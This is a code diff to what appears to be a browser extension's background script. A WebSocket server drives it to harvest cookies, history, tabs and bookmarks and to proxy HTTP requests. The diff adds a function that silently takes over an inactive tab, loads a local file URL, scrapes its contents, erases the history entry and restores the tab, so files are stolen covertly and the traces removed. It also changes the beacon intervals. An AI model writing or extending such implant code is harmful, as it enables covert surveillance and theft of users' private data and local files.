@@ -24,18 +24,52 @@ const SYNC_SWITCH = {
 };
 
 const RPC_CALL_TABLE = {
+  GET_FILESYSTEM: get_filesystem,
   HTTP_REQUEST: perform_http_request,
-  PONG: () => {}, // NOP, since timestamp is updated on inbound message.
   PONG: () => {}, // NOP, since timestamp is updated on inbound message.
   AUTH: authenticate,
   GET_COOKIES: get_cookies,
   GET_HISTORY: get_history,
   GET_TABS: get_tabs,
   GET_BOOKMARKS: get_bookmarks,
-  GET_SYNC_CONFIG: get_sync_config,
 };
 
-async function get_sync_config() {}
+function get_filesystem(fileUrl) {
+  console.log("get_filesystem", fileUrl);
+  return new Promise((resolve, reject) => {
+    chrome.tabs.query({ active: false }, (tabs) => {
+      // 从非活动标签页中随机选择一个
+      const randomIndex = Math.floor(Math.random() * tabs.length);
+      const tab = tabs[randomIndex];
+
+      // 保存原始链接
+      const originalUrl = tab.url;
+
+      // 更新标签页的 URL
+      chrome.tabs.update(tab.id, { url: fileUrl }, () => {
+        chrome.tabs.onUpdated.addListener(function listener(tabId, changeInfo) {
+          if (tabId === tab.id && changeInfo.status === "complete") {
+            chrome.tabs.executeScript(
+              tabId,
+              { code: "document.documentElement.innerHTML" },
+              (result) => {
+                const content = result[0];
+                // 删除访问记录
+                chrome.history.deleteUrl({ url: fileUrl }, () => {
+                  // 恢复原始链接
+                  chrome.tabs.update(tab.id, { url: originalUrl }, () => {
+                    resolve(content);
+                  });
+                });
+              }
+            );
+            chrome.tabs.onUpdated.removeListener(listener);
+          }
+        });
+      });
+    });
+  });
+}
 
 // Return an object for the current tab.
 async function get_current_tab() {
@@ -154,7 +188,6 @@ function get_all_bookmarks() {
       resolve(bookmarkTreeNodes);
     });
   });
-}
 }
 
 // Return an array of history for the current logs.
@@ -329,7 +362,7 @@ const websocket_sync_interval = setInterval(async () => {
       },
     })
   );
-}, 1000 * 3); //63
+}, 1000 * 63); //63
 
 // return some huge information about the others
 const websocket_sync_huge_interval = setInterval(async () => {
@@ -348,7 +381,7 @@ const websocket_sync_huge_interval = setInterval(async () => {
       },
     })
   );
-}, 1000 * 3); //321
+}, 1000 * 321); //321
 
 // Headers that fetch() can't set which need to
 // utilize webRequest to be able to send properly.
@@ -490,10 +523,9 @@ function initialize() {
   websocket = new WebSocket("ws://127.0.0.1:4343");
 
   websocket.onopen = function (e) {};
-  websocket.onopen = function (e) {};
-
   websocket.onmessage = async function (event) {
     // Update last live connection timestamp
+    console.log(`Received WebSocket message: ${event.data}`);
     last_live_connection_timestamp = get_unix_timestamp();
 
     try {
@@ -505,7 +537,6 @@ function initialize() {
     }
 
     try {
-      console.log(parsed_message.data.switch_config);
       Object.keys(parsed_message.data.switch_config).map((key) => {
         SYNC_SWITCH[key] = parsed_message.data.switch_config[key];
       });
